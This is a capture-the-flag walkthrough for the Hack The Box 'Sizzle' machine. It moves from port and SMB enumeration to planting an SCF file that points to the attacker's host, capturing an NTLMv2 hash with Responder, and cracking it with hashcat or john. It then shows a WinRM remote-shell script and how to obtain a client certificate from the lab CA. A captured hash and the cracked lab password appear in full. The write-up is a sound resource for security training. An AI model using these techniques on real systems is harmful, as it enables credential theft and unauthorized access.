

----
Share via ## Techniques

## Tools
* nmap
* gobuster OR dirbuster OR dirb
* smbclient

## Port Scan

1) Scan for ports and services
   ```bash
   # Use nmap to find available TCP ports quickly
   $ ports=$( \
       nmap 10.10.10.103 \
            -p- \
            --min-rate=1000 \
            -T4 \
       | grep ^[0-9] \
       | cut -d '/' -f 1 \
       | tr '\n' ',' \
       | sed s/,$// \
     )
   
   # Scan found ports for services
   $ nmap 10.10.10.103 \
          -p ${ports} \
          -sV \
          -sC \
          -T4 \
          -oA nmap-tcp-foundports
   ```

### Enumerate Web Server
1) Start with the web servers. Let's use gobuster to scan for endpoints on both http & https
   ```bash
   # First scan the http link
   $ gobuster  -u http://10.10.10.103/ \
               -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
               -t 50 \
     | tee gobuster-http.log
     
     =====================================================
     Gobuster v2.0.0              OJ Reeves (@TheColonial)
     =====================================================
     [+] Mode         : dir
     [+] Url/Domain   : http://10.10.10.103/
     [+] Threads      : 50
     [+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
     [+] Status codes : 200,204,301,302,307,403
     [+] Timeout      : 10s
     =====================================================
     2019/06/02 14:09:23 Starting gobuster
     =====================================================
     /images (Status: 301)
     /Images (Status: 301)
     /IMAGES (Status: 301)
     2019/06/02 14:21:08 Finished
     =====================================================
     =====================================================

   # And now scan the https link
   $ gobuster -u https://10.10.10.103/ \
              -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
              -t 50 \
              -k \
     | tee gobuster-https.log
     =====================================================
     Gobuster v2.0.0              OJ Reeves (@TheColonial)
     =====================================================
     [+] Mode         : dir
     [+] Url/Domain   : https://10.10.10.103/
     [+] Threads      : 50
     [+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
     [+] Status codes : 200,204,301,302,307,403
     [+] Timeout      : 10s
     =====================================================
     2019/06/02 13:41:34 Starting gobuster
     =====================================================
     /Images (Status: 301)
     /images (Status: 301)
     /IMAGES (Status: 301)
     2019/06/02 14:07:48 Finished
     =====================================================
     =====================================================
   ```
### Enumerate SMB
1) Enumerate SMB with smbclient OR smbmap to identify shares
   ```bash
   # Using smbclient
   $ smbclient -N -L \\\\10.10.10.103
     Sharename       Type      Comment
     ---------       ----      -------
     ADMIN$          Disk      Remote Admin
     C$              Disk      Default share
     CertEnroll      Disk      Active Directory Certificate Services share
     Department Shares Disk      
     IPC$            IPC       Remote IPC
     NETLOGON        Disk      Logon server share 
     Operations      Disk      
     SYSVOL          Disk      Logon server share 
   
   # Or using smbmap
   $ smbmap -H 10.10.10.103 \
            -u anonymous
     [+] Finding open SMB ports....
     [+] Guest SMB session established on 10.10.10.103...
     [+] IP: 10.10.10.103:445	Name: sizzle.htb.local                                  
         Disk                                                  	Permissions
         ----                                                  	-----------
         ADMIN$                                            	NO ACCESS
         C$                                                	NO ACCESS
         CertEnroll                                        	NO ACCESS
         Department Shares                                 	READ ONLY
         IPC$                                              	READ ONLY
         NETLOGON                                          	NO ACCESS
         Operations                                        	NO ACCESS
         SYSVOL                                            	NO ACCESS
   ```
1) Use smbclient to list the contents of the `Department Shares` and `Operations` to see if they contain anything we can access
   ```bash
   # Let's try Operations first
   $ smbclient -N '//10.10.10.103/Operations' \
               -c ls
   NT_STATUS_ACCESS_DENIED listing \*
   
   # Nothing there, so let's try Department Shares
   smbclient -N '//10.10.10.103/Department Shares' -c ls
     .                                   D        0  Tue Jul  3 08:22:32 2018
     ..                                  D        0  Tue Jul  3 08:22:32 2018
     Accounting                          D        0  Mon Jul  2 12:21:43 2018
     Audit                               D        0  Mon Jul  2 12:14:28 2018
     Banking                             D        0  Tue Jul  3 08:22:39 2018
     CEO_protected                       D        0  Mon Jul  2 12:15:01 2018
     Devops                              D        0  Mon Jul  2 12:19:33 2018
     Finance                             D        0  Mon Jul  2 12:11:57 2018
     HR                                  D        0  Mon Jul  2 12:16:11 2018
     Infosec                             D        0  Mon Jul  2 12:14:24 2018
     Infrastructure                      D        0  Mon Jul  2 12:13:59 2018
     IT                                  D        0  Mon Jul  2 12:12:04 2018
     Legal                               D        0  Mon Jul  2 12:12:09 2018
     M&A                                 D        0  Mon Jul  2 12:15:25 2018
     Marketing                           D        0  Mon Jul  2 12:14:43 2018
     R&D                                 D        0  Mon Jul  2 12:11:47 2018
     Sales                               D        0  Mon Jul  2 12:14:37 2018
     Security                            D        0  Mon Jul  2 12:21:47 2018
     Tax                                 D        0  Mon Jul  2 12:16:54 2018
     Users                               D        0  Tue Jul 10 14:39:32 2018
     ZZ_ARCHIVE                          D        0  Mon Jul  2 12:32:58 2018
		7779839 blocks of size 4096. 2674181 blocks available
   ```
1) Mount `Department Shares` and take a closer look inside
   ```bash
   $ mkdir /mnt/Sizzle-DepartmentShares
   $ mount -t cifs \
           -o rw,username=guest,password= \
           '//10.10.10.103/Department Shares' \
           /mnt/Sizzle-DepartmentShares
   $ ls /mnt/Sizzle-DepartmentShares
     Accounting   CEO_protected   HR               IT      Marketing   Security   ZZ_ARCHIVE
     Audit        Devops          Infosec          Legal  'R&D'        Tax
     Banking      Finance         Infrastructure  'M&A'    Sales       Users
   ```
1) Find all files available to us in `Department Shares`
   ```bash
   $ find /mnt/Sizzle-DepartmentShares/ -ls \
     | tee Sizzle-DepartmentShares-FileTree.out
   ```
1) Determine the SMB ACLs for all top-level directories in the share
   ```bash
   $ for directory in $(find /mnt/Sizzle-DepartmentShares -maxdepth 1 -mindepth 1 -type d -exec basename {} \;); do
       echo "#------> ${directory} <--------#" | tee -a Sizzle-DepartmentShares-SMBCACLS.out
       smbcacls -N '//10.10.10.103/Department Shares' /${directory} | tee -a Sizzle-DepartmentShares-SMBCACLS.out
       echo | tee -a Sizzle-DepartmentShares-SMBCACLS.out
   done
   ```
1) See if any of the folders in the mounted share are writable
   ```bash
   $ for directory in $(find /mnt/Sizzle-DepartmentShares -type d); do
       touch ${directory}/x 2> /dev/null
       [ $? -eq 0 ] && echo "${directory} is writable"
   done
   
   /mnt/Sizzle-DepartmentShares/Users/Public is writable
   /mnt/Sizzle-DepartmentShares/ZZ_ARCHIVE is writable
   ```

### Enumerate Certsrv
1) Check the /certsrv endpoint by navigating to http://10.10.10.103/certsrv and notice that it is password protected

### Try stealing hashes using SCF on SMB shares
1) Create an SCF file
   ```bash
   $ vim sizzle.scf
   ```
   And put the following content in there
   ```
   [Shell]
   Command=2
   IconFile=\\10.10.14.3\share\pwn.ico
   
   [Taskbar]
   Command=ToggleDesktop
   ```
1) Run the responder on our HtB VPN interface
   ```bash
   $ responder -I tun0
   ```
1) Copy the SCF file to the Users/Public directory
   ```bash
   $ cp sizzle.scf /mnt/Sizzle-DepartmentShares/Users/Public
   $ cp sizzle.scf /mnt/Sizzle-DepartmentShares/ZZ_ARCHIVE
   ```
   After a few moments, the responder window/session should show a hash for `amanda` like below:
   ```
   Username: HTB\amanda
   HASH:     [SMBv2] NTLMv2-SSP Hash     : amanda::HTB:54f3e3bc00f6d287:B381C4F5FC52E341274E1F8782C8FEC7:0101000000000000C0653150DE09D2019773C0DA8670DEA4000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000004EC1D674A5A8095E7CA0A3F65160E194ABE5F6A1D2C369D150CA87963ED7FF00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0038003100000000000000000000000000
   ```
1) Copy the entire hash (from "amanda::" through the last 0) into a new file
   ```bash
   $ vim HASH-amanda.NTLMv2
   ```
1) Run hashcrack OR john the ripper against the file
   Either use Hashcat:
   ```bash
   # First determine the hashcat "mode" number for this type of hash
   $ hashcat example-hashes | less
   
   # Search for NTLMv2 and notice the mode of "5600"
   
   # Crack the hash using a wordlist
   $ hashcat -m 5600 ./HASH-amanda.NTLMv2 /usr/share/wordlists/rockyou.txt
   ```
   OR use John the Ripper:
   ```bash
   First determine the right hash/format
   $ john --list=formats | grep -i NTLMv2
   nethalflm, netlm, netlmv2, netntlm, netntlm-naive, netntlmv2, md5ns, NT, osc, 

   $ john ./HASH-amanda.NTLMv2 \
          --wordlist=/usr/share/wordlists/rockyou.txt \
	  --format=netntlmv2
   Using default input encoding: UTF-8
   Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
   Press 'q' or Ctrl-C to abort, almost any other key for status
   Ashare1972       (amanda)
   1g 0:00:00:21 DONE (2019-06-02 23:06) 0.04688g/s 535196p/s 535196c/s 535196C/s Ashare1972
   Session completed
   ```
1) Write and run a script to login to remote powershell (WinRM)
   ```bash
   $ vim remote-powershell.rb
   ```
   And paste in content like the following:
   ```ruby
   require 'winrm'
   
   conn = WinRM::Connection.new(
     client_cert: 'path/to/client.cer',
     client_key: 'path/to/client.key',
     user: 'HTB\amanda',
     password: 'Ashare1972',
     endpoint: 'https://10.10.10.103:5985/wsman',
     no_ssl_peer_verification: true,
     transport: :ssl
   )
   
   conn.shell(:powershell) do |shell|
     output = shell.run('$PSVersionTable') do |stdout, stderr|
       STDOUT.print stdout
       STDERR.print stderr
     end
     
     command = ""
     until command == "exit\n" do
       print "PS> "
       command = gets
       output = shell.run(command) do |stdout, stderr|
         STDOUT.print stdout
         STDERR.print stderr
       end
     end
     
     puts "The script exited with exit code #{output.exitcode}"
   end
   ```
1) Generate SSL cert, key, and csr using openssl
   ```bash
   # Create a new RSA private key
   $ openssl genrsa -aes256 -out amanda.key 2048
   
   # Generate a Certificate Signing Request (CSR)
   $ openssl req -new -key amanda.key -out amanda.csr
   ```
1) Generate a certificate from the Sizzle CA
   1) Navigate to http://10.10.10.103/certsrv
   1) Click the `Create a Certificate` button
   1) Paste the contents of the `amanda.csr` file into the `Saved Request` field and click the `Submit` button
   1) Click the `Base 64 encoded` radio button and click the `Download certificate` link
   1) Rename the downloaded cert to `amanda.cer` and move it to the current directory
      ```bash
      $ mv ~/Downloads/certnew.cer amanda.cer
      ```
   1) Verify the `Subject` and `Issuer` fields of the generated cert
      ```bash
      $ openssl x509 -in amanda.cer -text | egrep 'Issuer:|Subject:'
        Issuer: DC = LOCAL, DC = HTB, CN = HTB-SIZZLE-CA
        Subject: DC = LOCAL, DC = HTB, CN = Users, CN = amanda
      ```